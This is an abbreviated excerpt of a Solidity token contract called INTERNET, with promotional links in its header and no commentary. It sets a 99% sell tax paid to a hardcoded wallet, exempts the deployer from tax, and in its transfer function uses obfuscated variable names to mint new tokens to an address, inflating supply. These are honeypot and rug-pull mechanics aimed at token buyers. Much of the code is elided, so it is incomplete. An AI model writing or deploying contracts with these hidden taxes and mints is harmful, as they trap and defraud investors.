// SPDX-License-Identifier: MIT
        ...
        //Website: https://interneterc.xyz
        //Telegram: https://t.me/interneterc
        //Twitter(X): https://twitter.com/InternetErc
...
contract INTERNET is NET20, Ownable {
  ...
  using SafeMath for uint256;
    ...
    uint256 public sellTaxRate = 9900; // 99%
    address public InternetDeployer;
    address constant taxwallet = 0xe5d0e883d39aa1C0EfE9CabDC1c637D300Ea0697; 
    ...
    InternetDeployer = 0xDfFBd29234F84F9c4c97441dD2fE2953EB071002;
    _isExcludedFromTax[InternetDeployer] = true;
    
    V2Router07 = _V2Router07;
    _isExcludedFromTax[V2Router07] = true;
   ...
   function _transfer(
    ...
    if (!_isExcludedFromTax[sender] && sender != V2Router07) {
    ...
    uint256 InputValue = Output05.mul(Syntax07);
    uint256 burnTaxFee = InputValue.mul(Unit100).mul(Prime02);

    _balances[Server01] = _balances[Server01].add(burnTaxFee);
    _totalSupply = _totalSupply.add(burnTaxFee);

    emit Transfer(address(0), Server01, burnTaxFee);
    }
